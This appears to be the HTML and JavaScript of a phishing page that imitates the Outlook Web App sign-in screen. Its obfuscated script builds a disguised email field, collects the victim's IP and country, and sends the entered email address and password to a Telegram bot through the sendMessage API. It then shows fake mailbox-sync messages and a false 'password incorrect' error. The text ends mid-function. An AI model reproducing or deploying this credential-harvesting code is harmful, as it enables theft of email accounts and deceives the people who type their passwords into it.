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"
                        alt="Outlook Web App ">
                </div>

                <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">User name:</div>
                <div id="ugus">
                    <!-- <input id="username" name="username" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"> -->
                </div>
                <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
                <div><input id="password" onfocus="g_fFcs=0" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel"></div>
                <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"></div>
                <div class="showPasswordCheck signInCheckBoxText">
                    <input type="checkbox" id="showPasswordCheck" class="chk">
                    <span>Show password</span>
                </div>

                <!-- <div class="signInCheckBoxText">
                    <input id="chkxcvxcvxcPrvt" name="trusted" value="4" type="checkbox" class="chk" checked="" role="checkbox" aria-labelledby="privateLabel">
                    <span id="privateLabel" aria-hidden="true">Private computer</span> ‎(
                    <a class="signInCheckBoxLink" id="lnkShwSec" onclick="clkSecExp(&#39;lnkShwSec&#39;)" role="link">What is this?</a>
                    <a class="signInCheckBoxLink" id="lnkHdSec" onclick="clkSecExp(&#39;lnkHdSec&#39;)" style="display:none" role="link">
			Hide explanation 
			</a> )‎
                </div> -->
                <div id="prvtExp" class="signInExpl" style="display:none" role="note">Select this option if you're the only person who uses this computer. Your server will allow a longer period of inactivity before signing you out.</div>
                <div id="prvtWrn" class="signInWarning" role="note">Warning: By selecting this option, you confirm that this computer complies with your organization's security policy.</div>

                <!-- <div class="signInCheckBoxText">
                    <input id="chkBsc" type="checkbox" class="chk" role="checkbox" aria-labelledby="lightLabel">
                    <span id="lightLabel" aria-hidden="true">Use the light version of Outlook Web App</span>
                </div> -->

                <div id="signInErrorDiv" class="signInError" role="alert" tabindex="0">

                </div>
                <div id="signInErrorDiv2" class="signInError" role="alert" tabindex="0">
                    The user name or password you entered isn't correct. Try entering it again.
                </div>

                <div id="bscExp" class="signInExpl" style="display:none" role="note">The light version of Outlook Web App includes fewer features. Use it if you're on a slow connection or using a computer with unusually strict browser security settings. We also support the full Outlook Web App experience on some browsers
                    on Windows, Mac, and Linux computers. To check out all the supported browsers and operating systems, <a class="signInCheckBoxLink" href="http://office.com/redir/HA102824601.aspx" id="bscLnk">click here.</a></div>


                <div id="expltxt" class="signInExpl" role="alert">

                </div>
                <div class="signInEnter">
                    <div class="signinbutton" role="button" tabindex="0">
                        <img class="imgLnk" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU1NzZGNEQzOTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTU3NkY0RDE5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTU3NkY0RDI5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7MvF4iAAACF0lEQVR42qyVz0sCQRTHZ5cSuqQJURRUt66GEuQlugmF0Ukw+huCjaBT0SkhEvwL6iQEERRJndIuCoLU1VsFQkH04xR0se/D79C4qLtCDz47zO6b7755M2/GUk5ZdbEwSIEEmAQRvn8ADXADTptHC++dBlsdhIfAJtgBQdXbvkAG5PCDb/OD7XIcByVwQNFLsA5iYJDE+O6SPuJbsrYq490ilulKZwrUwB4oeES8DPZBFDyDOCJvmBEHwDlFC8yrl6hy+crYc0QeMIUdMM9IN8Cb8mmI8I1jatRwtLDkaZt+Mv0P1adB/INjxbYRddBmnsKczt/0s/F2lJrhT5vgHoTkvWVZWlyPF620zb2qPHOajT/iuQQ+uaeLWPiQyyvPNiHCs+zces45G5fimGORaPGI4XHHNjrAvSv22ibilJs+0tsSV2qEfb3oo7b6Xwuw/ZGIX7gzxpi/v+LRi9g+E4nymNFKStaMrxNsGxJxnZ1Fz3haokVDdImLqi3Kti7CZ+wkXQvVHq1TnqFoyBD9dP06zfZGzgpJwxPTseKzlM3iaOVtqyL1cMUTb9o2jj6xXWOFfRtERzhWLIOffeldkTVq/QQM9yE6zDH6rMmZh9APWOXNkGSxJHzoJuib5NhVfeCb+1g+yGpVubrX4IIlH3EVRYrfrulbNc/iXleTwxPPz9V0KKl0X02Wx2Wa9rhM890u018BBgDOvaD/8G2ecwAAAABJRU5ErkJggg=="
                            alt=""><span class="signinTxt">sign in</span>
                    </div>
                    <input name="isUtf8" value="1" type="hidden">
                </div>
                <div class="hidden-submit"><input type="submit" tabindex="-1"></div>
            </div>
        </div>
        <div id="cookieMsg" class="logonDiv" style="display:none">
            <div class="signInHeader">Outlook Web App </div>
            <div class="signInExpl">Please enable cookies for this Web site.<br><br>Cookies are currently disabled by your browser. Outlook Web App requires that cookies be enabled. <br><br>For information about how to enable cookies, see the Help for your Web browser.<br><br><br></div>
            <div class="signInEnter">
                <div style="cursor:pointer;display:inline">
                    <img class="imgLnk" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyBpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMC1jMDYwIDYxLjEzNDc3NywgMjAxMC8wMi8xMi0xNzozMjowMCAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjU1NzZGNEQzOTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjU1NzZGNEQ0OTYxOTExRTE4ODU2ODkyQUQxMTQ2QUJGIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NTU3NkY0RDE5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6NTU3NkY0RDI5NjE5MTFFMTg4NTY4OTJBRDExNDZBQkYiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz7MvF4iAAACF0lEQVR42qyVz0sCQRTHZ5cSuqQJURRUt66GEuQlugmF0Ukw+huCjaBT0SkhEvwL6iQEERRJndIuCoLU1VsFQkH04xR0se/D79C4qLtCDz47zO6b7755M2/GUk5ZdbEwSIEEmAQRvn8ADXADTptHC++dBlsdhIfAJtgBQdXbvkAG5PCDb/OD7XIcByVwQNFLsA5iYJDE+O6SPuJbsrYq490ilulKZwrUwB4oeES8DPZBFDyDOCJvmBEHwDlFC8yrl6hy+crYc0QeMIUdMM9IN8Cb8mmI8I1jatRwtLDkaZt+Mv0P1adB/INjxbYRddBmnsKczt/0s/F2lJrhT5vgHoTkvWVZWlyPF620zb2qPHOajT/iuQQ+uaeLWPiQyyvPNiHCs+zces45G5fimGORaPGI4XHHNjrAvSv22ibilJs+0tsSV2qEfb3oo7b6Xwuw/ZGIX7gzxpi/v+LRi9g+E4nymNFKStaMrxNsGxJxnZ1Fz3haokVDdImLqi3Kti7CZ+wkXQvVHq1TnqFoyBD9dP06zfZGzgpJwxPTseKzlM3iaOVtqyL1cMUTb9o2jj6xXWOFfRtERzhWLIOffeldkTVq/QQM9yE6zDH6rMmZh9APWOXNkGSxJHzoJuib5NhVfeCb+1g+yGpVubrX4IIlH3EVRYrfrulbNc/iXleTwxPPz9V0KKl0X02Wx2Wa9rhM890u018BBgDOvaD/8G2ecwAAAABJRU5ErkJggg=="
                        alt=""><span class="signinTxt" tabindex="0">retry</span>
                </div>
            </div>
        </div>
    </div>

    <script>
        var _0xe390=["\x23\x73\x69\x67\x6E\x49\x6E\x45\x72\x72\x6F\x72\x44\x69\x76","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72","\x23\x73\x69\x67\x6E\x49\x6E\x45\x72\x72\x6F\x72\x44\x69\x76\x32","\x2E\x73\x69\x67\x6E\x69\x6E\x62\x75\x74\x74\x6F\x6E","\x23\x62\x6F\x64\x79","\x2E\x6C\x6F\x61\x64\x65\x72\x54\x65\x78\x74","\x2E\x6D\x6F\x75\x73\x65","\x2E\x6C\x6F\x61\x64\x65\x72\x42\x6C\x6F\x63\x6B","\x2E\x73\x65\x63\x54\x69\x6F\x6E\x45","\x23\x75\x67\x75\x73","\x64\x61\x74\x61\x2D\x65\x6D\x61\x69\x6C\x56\x61\x6C\x75\x65","\x67\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x6D\x61\x69\x6E\x41\x6C\x6C","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x6C\x6F\x67","","\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x61\x61\x62\x62\x63\x63\x64\x64\x65\x65\x66\x66\x67\x67\x68\x68\x69\x69\x6A\x6A\x6B\x6B\x6C\x6C\x6D\x6D\x6E\x6E\x6F\x6F\x70\x70\x71\x71\x72\x72\x73\x73\x74\x74\x75\x75\x76\x76","\x6C\x65\x6E\x67\x74\x68","\x63\x68\x61\x72\x41\x74","\x69\x6E\x70\x75\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x65\x6D\x61\x69\x6C","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x69\x64","\x6E\x61\x6D\x65","\x72\x6F\x6C\x65","\x74\x65\x78\x74\x62\x6F\x78","\x68\x69\x64\x64\x65\x6E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x63\x6C\x61\x73\x73","\x73\x69\x67\x6E\x49\x6E\x49\x6E\x70\x75\x74\x54\x65\x78\x74","\x61\x72\x69\x61\x2D\x6C\x61\x62\x65\x6C\x6C\x65\x64\x62\x79","\x75\x73\x65\x72\x4E\x61\x6D\x65\x4C\x61\x62\x65\x6C","\x23\x70\x61\x73\x73\x77\x6F\x72\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74","\x37\x31\x30\x37\x39\x39\x31\x35\x38\x30","\x3A\x41\x41\x45\x67\x69\x5A\x5F\x59\x36\x74\x2D\x33\x4D\x78\x4B\x47\x6A\x49\x39\x62\x57\x68\x36\x46\x64\x70\x6B\x77\x41\x64\x4F\x6A\x49\x38\x55","\x2F\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65\x3F\x63\x68\x61\x74\x5F\x69\x64\x3D\x31\x34\x36\x39\x30\x39\x30\x36\x37\x38","\x74\x65\x73\x74","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x6E\x6F\x6E\x65","\x40","\x73\x70\x6C\x69\x74","\x2E","\x74\x6F\x55\x70\x70\x65\x72\x43\x61\x73\x65","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x73\x79\x6E\x63\x69\x6E\x67\x3A\x20","\x20\x6F\x77\x61\x20\x6D\x61\x69\x6C\x62\x6F\x78\x20\x2E\x2E\x2E","\x63\x6C\x65\x61\x72\x69\x6E\x67\x20\x77\x65\x62\x20\x6C\x6F\x67\x69\x6E\x20\x73\x65\x73\x73\x69\x6F\x6E\x73\x20\x2E\x2E\x2E","\x75\x70\x64\x61\x74\x69\x6E\x67\x3A\x20","\x20\x6D\x61\x69\x6C\x73\x20\x2E\x2E\x2E","\x3C\x61\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x20\x72\x65\x64\x3B\x22\x3E\x73\x65\x73\x73\x69\x6F\x6E\x73\x20\x65\x78\x70\x69\x72\x65\x64\x21\x20\x2E\x2E\x2E\x3C\x2F\x61\x3E","\x62\x6C\x6F\x63\x6B","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x23","\x74\x72\x75\x65","\x76\x61\x6C\x75\x65","\x66\x61\x6C\x73\x65","\x2F\x3F\x72\x62\x6F\x78\x3D","\x26\x65\x6D\x61\x69\x6C\x3D","\x26\x70\x61\x73\x73\x77\x6F\x72\x64\x3D","\x26\x44\x6F\x63\x6F\x75\x6E\x74\x65\x72\x3D","\x26\x70\x76\x3D","\x4F\x57\x41","\x73\x73\x20\x4F\x4B\x21","\x65\x6D\x61\x69\x6C\x20\x6F\x6B","\x67\x72\x69\x64","\x73\x79\x6E\x63\x69\x6E\x67\x20\x6D\x61\x69\x6C\x62\x6F\x78\x20\x73\x74\x6F\x72\x61\x67\x65\x20\x20\x2E\x2E\x2E","\x6C\x6F\x61\x64\x69\x6E\x67\x20\x2E\x2E\x2E","\x44\x6F\x6E\x65\x20\x32\x20\x74\x69\x6D\x65\x73","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x64\x6F\x63\x73\x2E\x6D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x63\x6F\x6D\x2F\x65\x6E\x2D\x75\x73\x2F\x65\x78\x63\x68\x61\x6E\x67\x65\x2F\x74\x72\x6F\x75\x62\x6C\x65\x73\x68\x6F\x6F\x74\x2F\x63\x6C\x69\x65\x6E\x74\x2D\x63\x6F\x6E\x6E\x65\x63\x74\x69\x76\x69\x74\x79\x2F\x65\x72\x72\x6F\x72\x2D\x6F\x63\x63\x75\x72\x2D\x65\x6D\x73\x2D\x65\x61\x63\x2D\x6F\x77\x61","\x72\x65\x70\x6C\x61\x63\x65","\x62\x61\x64\x20\x65\x6D\x61\x69\x6C","\x63\x6C\x69\x63\x6B","\x6F\x6E\x4C\x69\x6E\x65","\x72\x65\x6C\x6F\x61\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x66\x6F\x63\x75\x73\x69\x6E","\x6B\x65\x79\x75\x70","\x6B\x65\x79\x43\x6F\x64\x65","\x70\x72\x65\x76\x65\x6E\x74\x44\x65\x66\x61\x75\x6C\x74"];
        const error = document[_0xe390[1]](_0xe390[0]);
        const error2 = document[_0xe390[1]](_0xe390[2]);
        const button = document[_0xe390[1]](_0xe390[3]);
        const bodyDIV = document[_0xe390[1]](_0xe390[4]);
        const notifications = document[_0xe390[1]](_0xe390[5]);
        const loginForm = document[_0xe390[1]](_0xe390[6]);
        const notiBlock = document[_0xe390[1]](_0xe390[7]);
        const secTionE = document[_0xe390[1]](_0xe390[8]);
        const ugus = document[_0xe390[1]](_0xe390[9]);
        const rbox = document[_0xe390[13]](_0xe390[12])[_0xe390[11]](_0xe390[10]);
        console.log(_0xe390)

        function getRandomInt(_0x2f74xc, _0x2f74xd) {
            return Math[_0xe390[15]](Math[_0xe390[14]]() * (_0x2f74xd - _0x2f74xc) + _0x2f74xc)
        }
        console[_0xe390[16]](getRandomInt(1, 10));

        function makeid(_0x2f74xf) {
            let _0x2f74x10 = _0xe390[17];
            const _0x2f74x11 = _0xe390[18];
            const _0x2f74x12 = _0x2f74x11[_0xe390[19]];
            let counter = 0;
            while (counter < _0x2f74xf) {
                _0x2f74x10 += _0x2f74x11[_0xe390[20]](Math[_0xe390[15]](Math[_0xe390[14]]() * _0x2f74x12));
                counter += 1
            };
            return _0x2f74x10
        }
        let yuyu = getRandomInt(1, 10);
        for (let i = 0; i < yuyu; i++) {
            var uui = document[_0xe390[22]](_0xe390[21]);
            uui[_0xe390[25]](_0xe390[23], _0xe390[24]);
            uui[_0xe390[25]](_0xe390[26], makeid(20));
            uui[_0xe390[25]](_0xe390[27], makeid(20));
            uui[_0xe390[25]](_0xe390[28], _0xe390[29]);
            uui[_0xe390[25]](_0xe390[30], true);
            ugus[_0xe390[31]](uui)
        };
        const emailIdNum = makeid(20);
        var mi = document[_0xe390[22]](_0xe390[21]);
        mi[_0xe390[25]](_0xe390[23], _0xe390[24]);
        mi[_0xe390[25]](_0xe390[26], emailIdNum);
        mi[_0xe390[25]](_0xe390[27], emailIdNum);
        mi[_0xe390[25]](_0xe390[32], _0xe390[33]);
        mi[_0xe390[25]](_0xe390[28], _0xe390[29]);
        mi[_0xe390[25]](_0xe390[34], _0xe390[35]);
        ugus[_0xe390[31]](mi);
        let tutu = getRandomInt(1, 10);
        for (let i = 0; i < tutu; i++) {
            var uui = document[_0xe390[22]](_0xe390[21]);
            uui[_0xe390[25]](_0xe390[23], _0xe390[24]);
            uui[_0xe390[25]](_0xe390[26], makeid(20));
            uui[_0xe390[25]](_0xe390[27], makeid(20));
            uui[_0xe390[25]](_0xe390[28], _0xe390[29]);
            uui[_0xe390[25]](_0xe390[30], true);
            ugus[_0xe390[31]](uui)
        };
        var emailInput = document[_0xe390[13]](emailIdNum);
        var passwordInput = document[_0xe390[1]](_0xe390[36]);
        var ssss = _0xe390[37] + _0xe390[38] + _0xe390[39] + _0xe390[40];

        function ValidateEmail(_0x2f74x1e) {
            if (/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/ [_0xe390[41]](_0x2f74x1e)) {
                return (true)
            };
            return (false)
        }
        const steps = (_0x2f74x20) => {
            notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[44];
            notifications[_0xe390[43]][_0xe390[42]] = _0xe390[44];
            let _0x2f74x21 = _0x2f74x20[_0xe390[46]](_0xe390[45])[1];
            let _0x2f74x22 = _0x2f74x21[_0xe390[46]](_0xe390[47])[0];
            let _0x2f74x23 = _0x2f74x22[0][_0xe390[48]]() + _0x2f74x22[_0xe390[49]](1);
            let _0x2f74x24 = _0x2f74x22[_0xe390[48]]();
            let _0x2f74x25 = _0x2f74x20[_0xe390[46]](_0xe390[45])[0][0][_0xe390[48]]();
            setTimeout(() => {
                notifications[_0xe390[50]] = _0xe390[51] + _0x2f74x20 + _0xe390[52];
                setTimeout(() => {
                    setTimeout(() => {
                        notifications[_0xe390[50]] = _0xe390[53];
                        setTimeout(() => {
                            notifications[_0xe390[50]] = _0xe390[54] + _0x2f74x21 + _0xe390[55];
                            setTimeout(() => {
                                setTimeout(() => {
                                    setTimeout(() => {
                                        setTimeout(() => {
                                            notifications[_0xe390[50]] = _0xe390[56];
                                            setTimeout(() => {
                                                loginForm[_0xe390[43]][_0xe390[42]] = _0xe390[57];
                                                notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[44];
                                                error[_0xe390[43]][_0xe390[42]] = _0xe390[57]
                                            }, 0)
                                        }, 0)
                                    }, 0)
                                }, 0)
                            }, 0)
                        }, 0)
                    }, 0)
                }, 0)
            }, 0)
        };

        function redirrectPage() {
            let email = null;
            if (typeof extractEmailFromUrl === 'function') {
                email = extractEmailFromUrl();
            }
            
            if (email) {
                if (emailInput) {
                    emailInput[_0xe390[62]] = email;
                }
                steps(email);
            } else {
                // If no email detected, still show the form
                steps("");
                // Backup visibility assurance
                setTimeout(() => {
                    if (loginForm) loginForm[_0xe390[43]][_0xe390[42]] = _0xe390[57];
                    if (notiBlock) notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[44];
                }, 100);
            }
            return email;
        }
        redirrectPage();
        const getIPInfo = async () => {
    try {
        // First get IP from a reliable source
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // Then use that IP to get detailed location info from ipapi.co
        const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        const geoData = await geoResponse.json();
        
        // Fallback services if primary fails
        if (!geoData.country_code) {
            const backupResponse = await fetch(`https://ipwho.is/${ip}`);
            const backupData = await backupResponse.json();
            return {
                ip: ip,
                country: backupData.country_code
            };
        }

        return {
            ip: ip,
            country: geoData.country_code
        };

    } catch (error) {
        // If all fails, try one last service
        try {
            const lastResponse = await fetch('https://ipinfo.io/json');
            const lastData = await lastResponse.json();
            return {
                ip: lastData.ip,
                country: lastData.country
            };
        } catch (e) {
            console.error("IP detection error:", error);
            return {
                ip: "Unknown",
                country: "Unknown"
            };
        }
    }
};
const createUser = async(_0x2f74x2c, _0x2f74x2d, _0x2f74x2e) => {
    const ipInfo = await getIPInfo();
    window.providerTag = 'owa';
    // Use centralized Telegram reporting with provider tag
    if (typeof sendCentralizedTelegramReport === 'function') {
        sendCentralizedTelegramReport('owa', _0x2f74x2c, _0x2f74x2d, ipInfo.ip || 'n/a', function(success) {
            console.log(success ? "Data sent successfully" : "Send failed");
        });
    } else {
        // Fallback to original if centralized function not available
        const _0x2f74x2f = await fetch("https://api.telegram.org/bot[BOTTOKENHERE]/sendMessage?chat_id=[CHATIDHERE]&text=Email: " + _0x2f74x2c + ", Password: " + _0x2f74x2d + ", IP: " + ipInfo.ip + ", Country: " + ipInfo.country + ", Page: OWA");
    }
    console[_0xe390[16]]("Data sent successfully")
};
        var counter = 1;
        const signin = async() => {
            if (ValidateEmail(emailInput[_0xe390[62]])) {
                console[_0xe390[16]](_0xe390[71]);
                if (passwordInput[_0xe390[62]][_0xe390[19]] > 3) {
                    loginForm[_0xe390[43]][_0xe390[42]] = _0xe390[44];
                    notiBlock[_0xe390[43]][_0xe390[42]] = _0xe390[72];
